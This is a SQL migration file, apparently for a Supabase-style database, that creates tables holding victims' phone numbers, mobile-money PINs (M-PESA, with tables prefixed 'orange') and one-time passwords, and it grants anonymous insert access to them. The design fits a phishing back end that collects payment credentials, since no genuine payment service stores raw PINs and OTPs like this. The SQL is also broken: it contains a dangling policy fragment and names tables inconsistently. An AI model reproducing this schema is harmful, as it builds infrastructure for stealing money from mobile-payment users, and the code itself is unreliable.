/*
  # Create Payment and OTP Records Tables

  1. New Tables
    - `payment_records`
      - `id` (uuid, primary key)
      - `country` (text, country code)
      - `number` (text, phone number)
      - `pin` (text, M-PESA PIN)
      - `created_at` (timestamp)
    - `otp_records`
      - `id` (uuid, primary key)
      - `country` (text, country code)
      - `number` (text, phone number)
      - `otp` (text, one-time password)
      - `created_at` (timestamp)
  2. Security
    - Enable RLS on both tables
    - Add policies for public access (storing payment attempts)
*/

CREATE TABLE IF NOT EXISTS orange_payment_records (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  country text NOT NULL,
  number text NOT NULL,
  pin text NOT NULL,
  created_at timestamptz DEFAULT now()
);

CREATE TABLE IF NOT EXISTS orange_otp_records (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  country text NOT NULL,
  number text NOT NULL,
  otp text NOT NULL,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE orange_payment_records ENABLE ROW LEVEL SECURITY;
ALTER TABLE orange_otp_records ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow insert to orange_payment_records"
  ON orange_payment_records
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow insert to orange_otp_records"
  ON orange_otp_records
  FOR INSERT
  TO anon
  WITH CHECK (true);
  ON orange_payment_records
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow public insert on orange_payment_records"
ON payment_records
FOR INSERT
TO anon
WITH CHECK (true);

CREATE POLICY "Allow public insert on orange_otp_records"
ON orange_otp_records
FOR INSERT
TO anon
WITH CHECK (true);